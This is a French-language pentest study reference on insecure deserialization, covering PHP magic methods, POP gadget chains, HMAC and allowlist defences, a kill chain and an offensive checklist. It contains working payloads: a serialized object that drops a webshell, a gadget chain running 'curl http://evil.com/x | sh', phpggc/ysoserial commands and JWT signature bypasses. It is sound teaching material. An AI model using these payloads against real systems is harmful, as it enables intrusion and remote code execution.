# Sérialisation & désérialisation — Document de référence consolidé

> Sécurité applicative (AppSec) — offensive security / pentest web.
> Reconstruction complète du concept, paliers 1 à 6, kill chain, méthodologie
> boîte blanche / boîte noire, et checklist de contournement.

---

## 0. Résumé en une phrase

**L'insecure deserialization, c'est désérialiser une donnée qui a traversé une zone
non fiable en lui faisant confiance** — la faille naît de la combinaison d'un
*aller-retour non fiable* et d'un *format porteur de comportement*, et culmine en
exécution de code via des *gadget chains* assemblées avec du code déjà présent
dans l'application ou ses dépendances.

---

## 1. Le socle : qu'est-ce que sérialiser / désérialiser

Un programme en cours d'exécution manipule des **objets en mémoire** : des structures
vivantes faites d'adresses et de pointeurs, qui n'ont de sens que dans le processus
courant. Dès qu'on veut faire *sortir* cette donnée du programme — l'envoyer sur le
réseau, l'écrire sur disque, la stocker dans un cookie — on se heurte à un mur : ces
canaux ne comprennent ni objets, ni pointeurs, ni adresses. Ils ne connaissent qu'une
**séquence linéaire et plate d'octets**.

- **Sérialiser** = aplatir la structure vivante en une séquence plate (souvent du texte).
  *Structure mémoire → chaîne plate.*
- **Désérialiser** = reconstruire un objet en mémoire à partir de cette chaîne plate.
  *Chaîne plate → structure mémoire.*

**Analogie du meuble IKEA :** un meuble monté = l'objet en mémoire ; impossible à
expédier tel quel. On le démonte en pièces plates + notice (sérialisation), on expédie
le carton (les octets), on remonte à l'arrivée (désérialisation).

**Point crucial : le résultat est un CLONE.** Le format sérialisé n'a *aucune identité
mémoire* — pas de pointeur, pas d'adresse. La désérialisation *reconstruit à neuf* une
structure équivalente avec ses propres adresses. Ce n'est jamais l'objet original
« téléporté », même sur la même machine, même dans le même processus. La copie ne vient
pas de la distance entre machines, mais de la **nature même du format** : il ne
transporte que de la *description*, jamais l'objet.

```js
const user = { name: "Yassir", roles: ["student", "hacker"] };
const blob = JSON.stringify(user);   // texte plat, transportable
const clone = JSON.parse(blob);      // NOUVEL objet, nouvelles adresses
```

---

## 2. Le curseur de dangerosité : donnée inerte vs comportement

Concept central pour toute la sécurité. Les formats sérialisés se placent sur un
**spectre** entre deux extrêmes.

### Extrême 1 — formats de données INERTES
`JSON`, `XML`, `YAML` (mode sûr). Ne décrivent que de la **donnée pure** : chaînes,
nombres, booléens, listes, paires clé/valeur. Par conception, la grammaire du format
**ne peut pas** exprimer « instancie telle classe » ou « exécute ce code ».
La désérialisation ne produit que de la donnée morte.

> *Analogie :* une **liste de courses**. La lire ne *fait* rien. Le pire qu'une donnée
> inerte puisse faire, c'est **être fausse** — jamais **agir**.

### Extrême 2 — formats PORTEURS DE COMPORTEMENT
`pickle` (Python), sérialisation native `Java`, `serialize()` (PHP), `Marshal` (Ruby),
`BinaryFormatter` (.NET). Encodent **quelles classes reconstruire** et **comment**.
Pendant la reconstruction, le désérialiseur peut **exécuter du code** : constructeurs,
méthodes magiques (`__reduce__` pickle, `readObject` Java, `__wakeup`/`__destruct` PHP).

> *Analogie :* une **recette que la cuisine exécute automatiquement à la lecture**.
> Le simple fait de reconstruire déclenche des opérations.

### Le curseur
```
donnée purement inerte  ───────────────────────────►  désérialiser = exécuter
JSON / XML                YAML(load) / .NET            pickle / Java / PHP / Ruby
```

### Le piège du base64
- **base64 = un ENCODAGE, pas un format de sérialisation.** Il représente des octets
  quelconques avec un alphabet sûr (`A-Z a-z 0-9 + /`) pour les rendre transportables
  (cookie, URL). C'est une **couche par-dessus** la sérialisation, pas un remplacement.
- **base64 ≠ chiffrement.** Aucune protection, réversible sans clé : `atob()`,
  `base64 -d`. Voir du base64 ne veut *pas* dire « caché » ou « protégé » — juste
  « rendu compatible avec le canal ». L'attaquant décode, lit, modifie, ré-encode.

---

## 3. Le pattern qui crée la faille : l'ALLER-RETOUR non fiable

L'image naïve (« l'appli sérialise ses données sortantes et désérialise l'input entrant »)
rate le vrai pattern. La vulnérabilité naît d'un **aller-retour** :

> **L'application sérialise son propre état interne, le confie au client
> (cookie / champ caché), puis le récupère et le désérialise en lui faisant confiance.**

### Pourquoi les applis font ça
Le stockage d'état côté serveur coûte cher.
- **Option A — état côté serveur :** le serveur garde l'état (RAM, Redis, SQL) ; le
  client ne reçoit qu'un identifiant opaque (`sessionid=a3f9…`) qui *désigne* une entrée.
- **Option B — état côté client :** le serveur ne garde rien, **sérialise l'état complet**
  dans un cookie / champ caché, et le client le renvoie à chaque requête. Séduisant :
  pas de base de sessions, scale horizontal trivial. C'est la « session cookie-based ».

L'option B ouvre le trou.

### La faille de raisonnement
Le dev pense : *« c'est mon propre état, je l'ai fabriqué, donc au retour je peux lui
faire confiance. »* **Faux.** Entre la sortie et le retour, la donnée est passée sur
la **machine de l'attaquant**. Tout ce qui traverse le client est, par définition, de
l'**input utilisateur** — même fabriqué par le serveur au départ.

> *Analogie de la valise :* tu confies ta valise dans le hall, tu vas boire un café, tu
> la reprends **sans la vérifier** « parce que c'est la mienne ». Pendant ton absence,
> on a eu tout le temps de l'ouvrir, la vider, la remplir, la refermer.

### La frontière de confiance
```
[Serveur, aller] ── sérialise ──►  ~~~ ZONE NON FIABLE ~~~  ──► [Serveur, retour]
                                    (lit / modifie / renvoie)      désérialise
                                    ▲
                                    │ la confiance DOIT se briser ICI,
                                    │ à la SORTIE — pas au retour
```

### L'intersection avec le curseur (§2) — c'est là que se joue la gravité
| Pattern | Ce que l'attaquant obtient |
|---|---|
| Aller-retour + **format inerte** (JSON) | **Tampering** : falsifier des valeurs (`role:user`→`admin`). Grave, mais pas d'exécution. |
| Aller-retour + **format porteur** (pickle/Java/PHP) | **RCE** : la reconstruction elle-même déclenche du code. |

---

## 4. Mécanique concrète : `unserialize()` PHP et les méthodes magiques

PHP est le terrain d'apprentissage idéal : la sérialisation est en **texte lisible**.
Le mécanisme conceptuel est identique en Java / Python / Ruby ; seul le format change.

### 4.1 Lire un blob PHP sérialisé
```php
class User { public $username = "yassir"; public $isAdmin = false; }
echo serialize(new User());
// O:4:"User":2:{s:8:"username";s:6:"yassir";s:7:"isAdmin";b:0;}
```
Décodage :
- `O:4:"User"` → un **O**bjet, classe de 4 caractères `"User"`.
- `:2:` → **2** propriétés.
- `s:8:"username"` → **s**tring de 8 car. (nom de propriété).
- `s:6:"yassir"` → valeur, string de 6 car.
- `b:0` → **b**oolean = `0` = `false`.

**Le pivot :** le **nom de la classe est écrit dans le blob** (`O:4:"User"`). C'est la
signature d'un format porteur de comportement. `unserialize()` va **choisir la classe
et l'instancier**. Le JSON, lui, aurait écrit `{"username":"yassir","isAdmin":false}` —
aucune classe, aucune instanciation.

### 4.2 Tampering trivial (cas A)
L'attaquant décode le cookie, voit le texte lisible, change `b:0`→`b:1` (et ajuste les
compteurs de longueur pour les strings, ex. `s:5:"admin"`), ré-encode, renvoie.
→ escalade de privilèges. **On reste dans le tampering, rien n'est exécuté.**

### 4.3 Le saut : les méthodes magiques
PHP appelle **automatiquement** certaines méthodes selon le cycle de vie de l'objet,
sans que personne les invoque :
- **`__wakeup()`** — appelée par `unserialize()` juste après reconstruction (usage
  légitime : ré-ouvrir une ressource non sérialisable).
- **`__destruct()`** — appelée à la destruction de l'objet (fin de script / plus
  référencé ; usage légitime : nettoyer, fermer un fichier).

Danger : ces méthodes s'exécutent **sans appel explicite du dev**. Si leur corps fait
une opération sensible dont l'attaquant contrôle les paramètres (via les propriétés,
qu'il maîtrise dans le blob) → **exécution**.

### 4.4 Scénario RCE de bout en bout (gadget unique)
```php
class LogWriter {
    public $logFile = "/var/log/app/debug.log";
    public $data    = "";
    public function __destruct() {                 // magique, auto-déclenchée
        file_put_contents($this->logFile, $this->data);  // le sink
    }
}
```
La faute d'origine, ailleurs dans l'appli :
```php
$session = unserialize($_COOKIE['session']);       // input non fiable désérialisé
```
`unserialize()` reconstruira **n'importe quelle classe nommée dans le blob** — y compris
`LogWriter`, jamais prévue pour transiter par un cookie.

Payload fabriqué par l'attaquant :
```php
$x = new LogWriter();
$x->logFile = "/var/www/html/shell.php";
$x->data    = '<?php system($_GET["cmd"]); ?>';
echo base64_encode(serialize($x));
```
Déroulé côté serveur :
1. `unserialize()` voit `O:9:"LogWriter"` → instancie un `LogWriter` aux propriétés
   contrôlées par l'attaquant.
2. Fin de requête → PHP appelle **automatiquement** `__destruct()`.
3. `file_put_contents("/var/www/html/shell.php", "<?php system(...) ?>")` écrit un
   webshell dans la racine web.
4. `http://cible/shell.php?cmd=id` → **RCE**.

Le dev n'a jamais écrit « exécute le code de l'attaquant ». Il avait juste (a) une classe
anodine avec une méthode magique touchant le FS, et (b) un `unserialize()` sur input non
fiable. L'attaquant a **assemblé** deux pièces innocentes.

### 4.5 Le concept : GADGET
Un **gadget** = une classe inoffensive en soi, mais qui devient une arme quand un
attaquant contrôle ses propriétés et déclenche sa méthode magique. L'attaquant **n'injecte
pas de code** : il **détourne du code déjà présent** dans l'appli ou ses dépendances.

---

## 5. Gadget chains — POP (Property-Oriented Programming)

Dans la vraie vie, une seule classe ayant *à la fois* la méthode magique auto-déclenchée
*et* l'opération dangereuse est rare. L'attaquant doit **relier** :
- un **point d'entrée auto-déclenché** (méthode magique, corps anodin) ;
- à une **opération dangereuse** (le sink) située dans une **autre** classe.

C'est la **gadget chain**, et la technique s'appelle **POP (Property-Oriented
Programming)** : l'attaquant *programme* uniquement en **choisissant quels objets vont
dans quelles propriétés**. Zéro code injecté — que du code existant, réagencé.
(Pendant, côté désérialisation, du ROP — Return-Oriented Programming — du binaire.)

### 5.1 Le mécanisme du saut : dynamic dispatch NON TYPÉ
Quand une méthode fait :
```php
$this->handler->close();
```
PHP appelle `close()` sur **l'objet réellement présent** dans `$handler`, à l'exécution.
Il ne vérifie **jamais** que `$handler` est bien du type attendu par le dev. Le
« contrat » (`$handler` est un `CacheHandler`) n'existe **nulle part dans le code** :
c'est une **supposition dans la tête du dev**. Le blob sérialisé écrase cette supposition
en plaçant un objet d'un **autre** type — pourvu qu'il ait une méthode `close()`.

> **La faille, c'est l'absence de vérification de type sur une propriété que l'attaquant
> contrôle.**

### 5.2 Scénario chaîné, de bout en bout
```php
// A — kick-off : méthode magique, corps anodin
class FileCache {
    public $handler;                         // le dev suppose un CacheHandler
    public function __destruct() { $this->handler->close(); }
}
// B — le handler légitime que le dev imagine
class CacheHandler { public function close() { /* ferme un fichier, inoffensif */ } }
// C — utilitaire qui traîne (code métier OU dépendance), méthode homonyme dangereuse
class CommandRunner {
    public $cmd;
    public function close() { system($this->cmd); }   // LE SINK
}
```
Faute d'origine : `$session = unserialize($_COOKIE['session']);`

Payload (côté attaquant) — objet imbriqué dans une propriété :
```php
$runner = new CommandRunner();  $runner->cmd = "curl http://evil.com/x | sh";
$cache  = new FileCache();      $cache->handler = $runner;   // le sink DANS handler
echo base64_encode(serialize($cache));
// O:9:"FileCache":1:{s:7:"handler";O:13:"CommandRunner":1:{s:3:"cmd";s:26:"curl http://evil.com/x | sh";}}
```
Trace côté serveur :
1. `unserialize()` instancie `FileCache`, et dans `handler` instancie un `CommandRunner`
   (cmd contrôlé).
2. Fin de requête → `FileCache::__destruct()` se déclenche seul.
3. `$this->handler->close()` — mais `handler` est un `CommandRunner`.
4. → `CommandRunner::close()` → `system("curl … | sh")`.
5. **RCE.** Le `CacheHandler` légitime a été court-circuité.

### 5.3 Vocabulaire
- **Kick-off gadget** — la classe avec la méthode magique ; point d'entrée auto-déclenché.
- **Sink** — l'opération dangereuse finale : `system`, `eval`, `include`,
  `file_put_contents`, désérialisation secondaire, etc.
- **Gadget chain** — la suite d'objets imbriqués reliant kick-off → sink, saut par saut,
  chaque saut via un appel de méthode sur une propriété au type choisi par l'attaquant.
- **POP** — écrire l'exploit uniquement en composant des objets dans des propriétés.

### 5.4 Gadgets universels dans les dépendances — le vrai danger
Les gros frameworks contiennent des classes qui, **combinées**, forment des chaînes
complètes vers le RCE, présentes dans des millions d'applis :
- **PHP :** Laravel, Symfony, Monolog, Guzzle.
- **Java :** Commons-Collections, Spring, Groovy.

Outils qui packagent ces chaînes clés en main :
- **PHPGGC** (PHP Generic Gadget Chains) — `phpggc Monolog/RCE1 system id`.
- **ysoserial** (Java) — `java -jar ysoserial.jar CommonsCollections1 'id'`.

L'attaquant n'a **pas besoin de lire ton code métier** : si l'appli désérialise un input
non fiable **et** embarque une version vulnérable d'un framework connu, une chaîne
pré-fabriquée suffit.

---

## 6. Défenses (et l'angle de contournement de chacune)

Ordre de solidité décroissante. La 1 supprime le problème ; 2-3-4 le réduisent.

### Défense 1 — Ne pas désérialiser d'input non fiable (LA racine)
Rien qui franchit une frontière de confiance ne doit revenir dans un désérialiseur
porteur de comportement. Pour faire voyager de l'état par le client → **format inerte**.
```php
// À bannir sur input client :  $d = unserialize($_COOKIE['session']);
$d = json_decode($_COOKIE['session'], true);   // donnée inerte, aucune classe instanciée
```
Pourquoi c'est la racine : la grammaire du format **interdit** l'exécution (§2).
L'attaque est structurellement morte, quels que soient les gadgets présents dans `vendor/`.

**Limite :** règle l'exécution, **pas le tampering** (cas A). Dès qu'un état sensible fait
l'aller-retour → il faut *aussi* la défense 2.

### Défense 2 — Intégrité : signer le blob (HMAC)
Réponse directe au problème de l'aller-retour (§3). On ne peut pas empêcher le client de
*lire*, mais on détecte s'il a **modifié**, via une signature à secret serveur.
```php
// Aller — on signe
$payload = json_encode($state);
$sig     = hash_hmac('sha256', $payload, $SERVER_SECRET);
$cookie  = base64_encode($payload) . '.' . $sig;

// Retour — RE-CALCULER et COMPARER avant TOUTE utilisation
[$b64, $sigRecue] = explode('.', $cookie);
$payload      = base64_decode($b64);
$sigAttendue  = hash_hmac('sha256', $payload, $SERVER_SECRET);
if (!hash_equals($sigAttendue, $sigRecue)) { die('Cookie trafiqué'); }  // rejet AVANT
$state = json_decode($payload, true);                                    // seulement après
```
La confiance est rétablie **au bon moment** (au retour) par une **preuve cryptographique**,
pas par « c'est moi qui l'ai fait ».

**Contournements :**
- **Secret faible / fuité** (deviné, ou commité dans un dépôt Git) → l'attaquant reforge
  des signatures. Toute la défense repose sur le secret.
- **Confusion d'algorithme** (classique JWT) : si le serveur suit le champ `alg` fourni
  *dans* le token → `alg:none` (« rien à vérifier »), ou bascule RS256→HS256 en utilisant
  la clé publique comme secret HMAC. **Ne jamais laisser l'input dicter comment on le vérifie.**
- **Vérification absente / mal placée** : désérialiser *avant* de vérifier, ou comparer
  avec `==` au lieu de `hash_equals` (timing attack). **Ordre sacré : vérifier → rejeter
  si faux → et seulement après, désérialiser.**

### Défense 3 — Restreindre les classes désérialisables (allowlist de types)
Quand on est coincé avec un format porteur (legacy imposé), au moins limiter les classes
instanciables → couper l'accès aux gadgets.
```php
$d = unserialize($input, ['allowed_classes' => ['User', 'Cart']]);  // le reste : refusé
```
Java : `ObjectInputFilter` (JEP 290) / look-ahead deserialization — filtrer les noms de
classe **avant** reconstruction.

**Contournements :**
- **Allowlist trop large** : `['allowed_classes' => true]` (= tout autoriser) ne fait rien.
- **Une classe autorisée est elle-même un gadget** : si `User` a un `__wakeup()`
  exploitable, l'allowlist ne sauve pas. **Autoriser une classe ≠ cette classe est inoffensive.**

### Défense 4 — Libs / formats éprouvés (conception)
Privilégier des bibliothèques open source très utilisées et auditées ; des formats à
faible surface (JSON ; YAML *en mode sûr*). Fuir les sérialiseurs maison / obscurs.
> Cas réel : `serialize-javascript` < 3.0.9 — un échappement de guillemets défaillant
> créait de l'injection de code si la sortie passait par `eval()`.

**Contournement :** « populaire » ≠ « sans faille connue ». **La fonction et l'option**
décident du mode, pas le format : `yaml.load` (PyYAML) instancie des objets arbitraires →
porteur de comportement ; `yaml.safe_load` → inerte. Idem `pickle` reste dangereux quel
que soit son emballage.

### Hiérarchie
```
(1) Ne pas désérialiser d'input non fiable   → SUPPRIME le problème (cause profonde)
(2) HMAC sur l'aller-retour                  → rétablit l'INTÉGRITÉ (cause profonde du §3)
(3) Allowlist de classes                     → réduit la SURFACE (symptôme)
(4) Libs/formats éprouvés                    → réduit la probabilité de bug (conception)
```
Appli sérieuse = empilement : **format inerte (1) + signature (2)** sur tout aller-retour
d'état sensible. Fail-safe + défense en profondeur.

---

## 7. Deux principes transverses à graver

1. **Format vs signature — deux propriétés ORTHOGONALES.**
   Le **format** décide de l'**exécution** (inerte → pas de RCE, jamais).
   La **signature** décide de l'**intégrité** (présente → pas de tampering).
   Virer la signature d'un cookie JSON ne rend pas le RCE possible (le format l'interdit
   toujours), mais rouvre le **tampering**. Ne jamais confondre « safe contre l'exécution »
   et « safe contre la falsification ».

2. **Allowlist = raisonner sur des IDENTITÉS, pas sur des COMPORTEMENTS.**
   Une liste de permission demande « ce nom (de classe / de clé) est-il autorisé ? », pas
   « que peut *faire* cette chose une fois admise ? ». Même angle mort que sur la prototype
   pollution (clés libres, `constructor.prototype`). **Filtrer *quoi* entre ne dit rien sur
   ce que ça *déclenche*.** Une allowlist réduit la surface, ne certifie pas l'innocuité.

---

## 8. Kill chain de l'attaque

```
1. RECON        Repérer un aller-retour : cookie / champ caché / paramètre contenant un
                blob (souvent base64). Décoder → lire le format.
                     │
2. IDENTIFIER    Le format est-il porteur de comportement ?
   LE FORMAT       - PHP :  O:...:"Classe":...   (texte lisible)
                   - Java : magic bytes 0xACED0005  → base64 "rO0AB..."
                   - Python pickle : opcodes (\x80 en tête)
                   - Ruby Marshal : "\x04\x08..."
                   - .NET : BinaryFormatter / TypeNameHandling
                     │
3. CONFIRMER     Tampering trivial d'abord (changer une valeur, ajuster les longueurs).
   LE CONTRÔLE     Ça prouve : (a) désérialisation d'input non fiable, (b) pas de
                   signature valide vérifiée. → au minimum privilege escalation.
                     │
4. TROUVER       Boîte blanche : grep les méthodes magiques + les sinks (voir §9).
   UNE CHAÎNE      Boîte noire : identifier framework + version → PHPGGC / ysoserial.
                     │
5. ARMER         Construire le payload : imbriquer les objets (POP), placer le sink dans
                 la bonne propriété, régler les compteurs de longueur, (base64-)encoder.
                     │
6. LIVRER        Injecter dans le canal de l'aller-retour, déclencher la désérialisation.
                     │
7. IMPACT        RCE (serveur) / XSS (client) / privesc / DoS / SSRF / write-file.
```

---

## 9. Méthodologie — boîte blanche & boîte noire

### 9.1 Boîte blanche (accès au code)
**Étape 1 — trouver les points de désérialisation sur input non fiable.**
```bash
# PHP
grep -rn "unserialize(" .            # surtout sur $_COOKIE / $_POST / $_GET / headers
# Java
grep -rn "readObject\|ObjectInputStream\|XMLDecoder\|readUnshared" .
# Python
grep -rn "pickle.load\|pickle.loads\|yaml.load\|marshal.loads\|jsonpickle" .
# Ruby
grep -rn "Marshal.load\|YAML.load\|Oj.load" .
# .NET
grep -rn "BinaryFormatter\|LosFormatter\|TypeNameHandling\|NetDataContractSerializer" .
```
**Étape 2 — inventorier les kick-off (méthodes magiques) — dans le code ET dans `vendor/`.**
```bash
# PHP
grep -rn "__wakeup\|__destruct\|__toString\|__call\|__get\|__set" . vendor/
```
- Java : `readObject`, `readResolve`, `finalize`, `validateObject`.
- Python pickle : `__reduce__`, `__reduce_ex__`, `__setstate__`.
**Étape 3 — inventorier les sinks.** `system exec eval passthru shell_exec proc_open`
`include require file_put_contents fwrite call_user_func` `Runtime.exec` `ProcessBuilder`
`os.system subprocess Popen`.
**Étape 4 — tracer une chaîne** d'un kick-off vers un sink via des appels de méthode sur
des propriétés (chercher `$this->prop->method()` avec `prop` non typé strictement).

### 9.2 Boîte noire (pas d'accès au code)
1. **Repérer les blobs** dans cookies / champs cachés / paramètres. Suspects : base64 se
   terminant par `=`, chaînes commençant par `rO0AB` (Java), `O:` (PHP en clair), `\x80`
   (pickle), `gAJ9` (pickle base64).
2. **Tampering d'abord** : décoder, modifier une valeur, ré-encoder. Réaction du serveur
   → confirme la désérialisation non signée.
3. **Fingerprint** du framework et de sa version (bannières, erreurs, `/vendor/`, hashes
   d'assets, `composer.lock` exposé…).
4. **Payloads génériques** : `phpggc -l` / `ysoserial` selon les libs détectées ; tester
   chaque chaîne compatible.
5. **Détection OOB** si pas de retour visible : payload qui déclenche un `curl` / requête
   DNS vers un serveur contrôlé (Burp Collaborator) → confirme l'exécution en aveugle.

---

## 10. Checklist rapide de contournement (pense-bête offensif)

- [ ] Y a-t-il un **aller-retour** ? (cookie / hidden field / param qui revient au serveur)
- [ ] Le blob est-il juste **base64** ? → décoder, ce n'est PAS une protection.
- [ ] Le format est-il **porteur de comportement** ? (voir signatures §8) → viser le RCE.
      Sinon **inerte** → viser le tampering / privesc.
- [ ] **Tampering** simple accepté ? → pas de signature vérifiée → privesc immédiate.
- [ ] Signature présente → **secret faible / fuité** ? champ **`alg` manipulable**
      (`none`, RS256→HS256) ? vérif **placée après** la désérialisation ?
- [ ] **Allowlist** de classes → est-elle `true` / trop large ? une classe **autorisée
      est-elle elle-même un gadget** (`__wakeup` exploitable) ?
- [ ] **Framework + version** connus → **PHPGGC / ysoserial** : essayer les chaînes prêtes.
- [ ] Pas besoin de lire le code métier : les gadgets peuvent vivre **100 % dans `vendor/`**.
- [ ] Pas de retour visible → **exécution en aveugle** (OOB : DNS / HTTP callback).
- [ ] Sinks possibles au-delà du RCE : **write-file** (webshell), **include** (LFI→RCE),
      **SSRF**, **DoS** (objet récursif / gros graphe), **désérialisation secondaire**.

---

## 11. Glossaire

| Terme | Définition |
|---|---|
| Sérialisation | Aplatir une structure mémoire en séquence linéaire d'octets. |
| Désérialisation | Reconstruire un objet en mémoire depuis cette séquence (→ clone). |
| Donnée inerte | Format ne portant que de la donnée (JSON/XML) — pas d'exécution possible. |
| Porteur de comportement | Format encodant classes + logique de reconstruction (pickle/Java/PHP) — exécution à la désérialisation. |
| Aller-retour | État sérialisé confié au client puis redésérialisé au retour en lui faisant confiance. |
| Canal non fiable | Toute zone hors du contrôle du serveur (le client) que traverse la donnée. |
| Méthode magique | Méthode appelée automatiquement par le cycle de vie de l'objet (`__wakeup`, `__destruct`, `readObject`…). |
| Gadget | Classe inoffensive isolément, arme une fois ses propriétés contrôlées et sa méthode magique déclenchée. |
| Sink | Opération dangereuse finale (system, eval, include, write-file…). |
| Kick-off | Le gadget d'entrée : la classe à méthode magique auto-déclenchée. |
| Gadget chain | Suite d'objets imbriqués reliant kick-off → sink par sauts de propriété. |
| POP | Property-Oriented Programming : écrire un exploit en composant des objets, sans injecter de code. |
| Dynamic dispatch | Appel de méthode résolu sur le type réel de l'objet à l'exécution — non vérifié → détournable. |
| HMAC | Signature à secret partagé garantissant l'intégrité du blob au retour. |
| PHPGGC / ysoserial | Outils générant des gadget chains prêtes à l'emploi (PHP / Java). |

---

*Fin du document de référence — désérialisation.*
